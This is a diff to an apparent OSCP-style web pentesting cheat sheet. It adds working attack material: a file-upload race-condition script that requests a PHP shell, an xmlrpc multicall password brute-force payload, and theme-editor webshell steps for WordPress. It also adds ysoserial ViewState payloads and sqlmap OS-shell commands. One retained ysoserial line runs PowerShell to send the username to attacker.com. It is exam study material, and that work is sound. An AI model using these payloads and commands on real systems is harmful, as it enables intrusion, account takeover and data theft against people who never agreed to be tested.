@@ -111,6 +111,23 @@ then upload `shell.jpg` containing PHP code.
 
 ---
 
+### 1.6 Race Condition (TOCTOU) Upload Bypass
+**Explanation:** Some apps write the uploaded file to a web-accessible path first, then validate its content (extension/magic-bytes/AV scan) afterward and delete it if it fails — a time-of-check-to-time-of-use gap. Repeatedly requesting the predicted URL while re-uploading can catch the file during the brief window it's live and execute it before it's removed.
+
+**Example — parallel upload + request race:**
+```bash
+# Terminal 1: hammer the predicted URL as fast as possible
+while true; do curl -s -o /dev/null -w "%{http_code}\n" "http://target/uploads/shell.php?cmd=id"; done
+
+# Terminal 2: repeatedly (re-)upload the same file
+while true; do curl -s -F "file=@shell.php" http://target/upload.php > /dev/null; done
+```
+Or use Burp Intruder/Turbo Intruder with the "null payload" attack type sending the upload and the trigger request as close together as possible (same connection / HTTP/2 single-packet attack) for a tighter race window.
+
+**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html · https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md
+
+---
+
 ## 2. Insecure Deserialization Basics
 
 ### 2.1 PHP Object Injection (POP chains)
@@ -168,7 +185,11 @@ Look for serialized Java magic bytes in traffic/cookies to spot candidates: `AC 
 **Example:**
 ```
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
-ysoserial.exe -p ViewState    # list ViewState-specific plugin options
+
+# -p ViewState is the plugin that crafts a full __VIEWSTATE payload once a machine key is known;
+# it requires the recovered key/algorithm params below, not just "-p ViewState" on its own:
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" --apppath="/" --path="/default.aspx" \
+  --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
 ```
 
 **Reference:** https://github.com/pwntester/ysoserial.net · https://github.com/NotSoSecure/Blacklist3r (machine-key recovery) · https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet
@@ -215,6 +236,35 @@ curl -s "http://target/?author=1" -I                    # author enum via redire
 curl -s http://target/xmlrpc.php -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
 ```
 
+**xmlrpc.php `system.multicall` brute-force (bypasses per-request lockout/rate-limiting):**
+Bundles many `wp.getUsersBlogs` login attempts into a single HTTP request, so hundreds of credential guesses count as one hit to naive lockout plugins.
+```bash
+curl -s http://target/xmlrpc.php -X POST -d '<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.multicall</methodName>
+  <params><param><value><array><data>
+    <value><struct>
+      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+      <member><name>params</name><value><array><data>
+        <value><string>admin</string></value>
+        <value><string>password1</string></value>
+      </data></array></value></member>
+    </struct></value>
+    <value><struct>
+      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+      <member><name>params</name><value><array><data>
+        <value><string>admin</string></value>
+        <value><string>password2</string></value>
+      </data></array></value></member>
+    </struct></value>
+  </data></array></param></params>
+</methodCall>'
+# A successful pair returns blog data instead of a faultCode/faultString struct.
+# wpscan supports the same idea directly:
+wpscan --url http://target -U admin -P wordlist.txt --password-attack xmlrpc-multicall
+```
+Secondary use: `pingback.ping` on xmlrpc.php can be abused for SSRF/internal port scanning via the `pingback.ping` method.
+
 **Reference:** https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html
 
 ---
@@ -238,6 +288,26 @@ wpscan --url http://target --no-update
 ```
 
 **Reference:** https://github.com/wpscanteam/wpscan (usage docs); enumeration methodology cross-ref: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html
+
+---
+
+### 3.2b Authenticated RCE via Theme/Plugin Editor
+**Explanation:** Once valid wp-admin credentials are obtained (cracked via 3.2, found in a config/backup, or reused from another service), the fastest OSCP path to a shell is the built-in Theme/Plugin Editor — no plugin CVE required. Requires the logged-in user to hold the `edit_themes`/`edit_plugins` capability (default for Administrator) and that `DISALLOW_FILE_EDIT` is not set in `wp-config.php`.
+
+**Steps:**
+```
+1. Log in at http://target/wp-login.php with recovered creds.
+2. Navigate to Appearance > Theme Editor (wp-admin/theme-editor.php).
+3. Select an INACTIVE theme (avoid breaking the live site) from the theme dropdown.
+4. Pick a template that's reachable without auth, e.g. 404.php, and overwrite it with a PHP webshell:
+   <?php system($_GET['cmd']); ?>
+5. Click "Update File" (saves directly, no upload/AV checks).
+6. Trigger it:
+   curl "http://target/wp-content/themes/<theme-slug>/404.php?cmd=id"
+```
+Same technique applies to Plugins > Plugin Editor (`wp-admin/plugin-editor.php`) — edit any inactive/active plugin's PHP file the same way; useful when theme editing is disabled but plugin editing isn't (or vice versa).
+
+**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CMS%20-%20WordPress%20Pentest/README.md · https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html
 
 ---
 
@@ -290,7 +360,7 @@ whatweb -a 3 http://target
 curl -sI http://target                        # Server, X-Powered-By headers
 
 # 2. Automated broad fingerprint (covers WP, Joomla, Drupal, Magento, etc.)
-python3 CMSeeK.py -u http://target             # or: cmseek -u http://target
+python3 cmseek.py -u http://target             # or: cmseek -u http://target
 
 # 3. Nikto for quick generic misconfig/version banner sweep
 nikto -h http://target
@@ -316,9 +386,46 @@ General rule of thumb for the exam: fingerprint → version-pin → searchsploit
 
 ---
 
+### 4.1 VulnX — Multi-CMS Fingerprinting (WordPress/Joomla/Drupal/PrestaShop/OpenCart/Magento/Lokomedia)
+**Explanation:** VulnX is an actively-maintained (v1.9, 320+ commits) multi-CMS scanner — broader than wpscan/droopescan/CMSeeK in that one tool covers WordPress, Joomla, Drupal, PrestaShop, OpenCart, Magento, and Lokomedia detection plus domain/web/port recon in a single pass. Use its enumeration flags as a fast multi-CMS alternative/supplement to step 2 of the workflow above, or once a candidate CMS is already suspected.
+
+**Install:**
+```bash
+git clone https://github.com/anouarbensaad/vulnx.git
+cd vulnx
+pip install -r requirements.txt        # deps: requests, bs4
+python3 vulnx.py -u http://target -c all
+# or the repo's own installer (requires root; installs system-wide to /usr/local/bin/vulnx):
+# chmod +x install.sh && sudo ./install.sh
+```
+
+**Enumeration-only usage:**
+```bash
+vulnx -u http://target -c all              # CMS fingerprint: type, version, themes, plugins, users
+vulnx -u http://target -d -w               # -d: subdomain/domain info gathering, -w: web info (headers/tech)
+vulnx -u http://target -p                  # port scan
+vulnx -u http://target --dns               # DNS record collection
+vulnx -D <dork>                            # search Google dorks for CMS instances (OSINT, no direct target contact)
+vulnx --list-dorks                         # list built-in dork categories
+```
+- `-c/--cms-info` — identifies CMS type/version and enumerates themes, plugins, and users (multi-CMS equivalent of wpscan's `--enumerate vp,vt,u`)
+- `-d/--domain-info` — subdomain gathering against the target's domain
+- `-w/--web-info` — general web/header/tech info gathering
+- `-p/--ports` — port scan of the target
+- `--dns` — DNS record enumeration
+- `-D/--dorks` — Google dork search for the target CMS (passive/OSINT)
+
+All of the above are pure fingerprinting/enumeration — same risk profile as whatweb/wpscan/CMSeeK, and exam-safe.
+
+**Exam caveat:** `-e/--exploit` is documented by VulnX's own README, which describes the tool itself as an "intelligent Bot... Shell can achieve automatic injection" — the flag searches for a vulnerability matching the fingerprinted CMS/version and automatically runs the exploit/drops a shell, with no human decision point in between. This is squarely OffSec's banned "Automatic exploitation tools (e.g., db_autopwn, SQLmap, etc.)" category — never use `-e`/`--exploit` on the OSCP exam. Treat it as reference-only: fingerprint with `-c`/`-d`/`-w` as above, then take the confirmed CMS+version to searchsploit/CVE lookup and a manually-applied PoC per the workflow in §4 — same discipline as the sqlmap (§5) and tplmap (`web-core-vulnerabilities.md` §7.5) `--os-shell`/`--os-cmd` caveats.
+
+**Reference:** https://github.com/anouarbensaad/vulnx
+
+---
+
 ## 5. sqlmap — Tamper Scripts & Shell Escalation
 
-**Explanation:** Beyond `-u`/`--dbs`, sqlmap's tamper scripts rewrite the injection payload (encoding, comment insertion, casing tricks) to evade naive filters/WAFs, and the `--os-shell`/`--sql-shell` flags turn a confirmed injection into OS-level access where DBMS privileges allow it. Not currently documented elsewhere in this repo — sqlmap is a core OSCP tool.
+**Explanation:** Beyond `-u`/`--dbs`, sqlmap's tamper scripts rewrite the injection payload (encoding, comment insertion, casing tricks) to evade naive filters/WAFs, and the `--os-shell`/`--sql-shell` flags turn a confirmed injection into OS-level access where DBMS privileges allow it. sqlmap itself (detection, `--dbs`/`--dump`, tamper scripts) is a core OSCP tool with no restriction. **Exam caveat: `--os-shell`/`--os-cmd` (and other fully-automated OS-shell-spawning) are banned on the OSCP exam — see `enum-automation-frameworks.md` §"Banned fully-automated exploitation tools." Treat the commands below as reference-only; on exam day, use sqlmap to confirm/extract via the injection point, then escalate to an OS shell manually (e.g. `INTO OUTFILE`/`xp_cmdshell` crafted by hand) instead of `--os-shell`/`--os-cmd`.**
 
 **Tamper scripts for filter/WAF evasion** (chain multiple with commas):
 ```bash
@@ -335,10 +442,12 @@ sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --tamper=space2co
 sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --dbs                        # full enumeration pass
 sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump                       # dump a table
 sqlmap -u "http://target.com/page?id=1" --sql-shell                                     # interactive SQL shell
-sqlmap -u "http://target.com/page?id=1" --os-cmd whoami                                 # single OS command
-sqlmap -u "http://target.com/page?id=1" --os-shell                                      # full OS shell (needs MySQL FILE priv or MSSQL xp_cmdshell etc.)
+sqlmap -u "http://target.com/page?id=1" --os-cmd whoami                                 # BANNED on OSCP exam — fully-automated OS-shell spawning, reference-only
+sqlmap -u "http://target.com/page?id=1" --os-shell                                      # BANNED on OSCP exam — same restriction; needs MySQL FILE priv or MSSQL xp_cmdshell etc.
 sqlmap -u "http://target.com/search" --data="param1=blah&param2=blah" --cookie="JSESSIONID=..." -p param1 --level=5 --risk=3   # POST/cookie-based, target a specific param
 ```
+**Exam caveat:** `--os-cmd`/`--os-shell` automate the entire exploit-to-shell pipeline, which OffSec's exam rules ban ("Banned fully-automated exploitation tools: SQLmap in auto-exploit mode beyond its core function" — see `enum-automation-frameworks.md`). Everything else on this page (tamper scripts, `--dbs`, `--dump`, `--sql-shell` for read-only SQL exploration) is core SQLi detection/extraction and remains exam-safe. If OS access is warranted, achieve it manually from the confirmed injection point (e.g. hand-crafted `SELECT ... INTO OUTFILE`, `xp_cmdshell` enabled/invoked by hand) rather than sqlmap's automated flags.
+
 **Reference:** https://github.com/sqlmapproject/sqlmap · https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/
 
 ---
@@ -356,3 +465,4 @@ sqlmap -u "http://target.com/search" --data="param1=blah&param2=blah" --cookie="
 - WPScan: https://github.com/wpscanteam/wpscan
 - Web Vulnerability Methodology (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/web-vulnerabilities-methodology.html
 - CMSeeK: https://github.com/Tuhinshubhra/CMSeeK
+- VulnX: https://github.com/anouarbensaad/vulnx
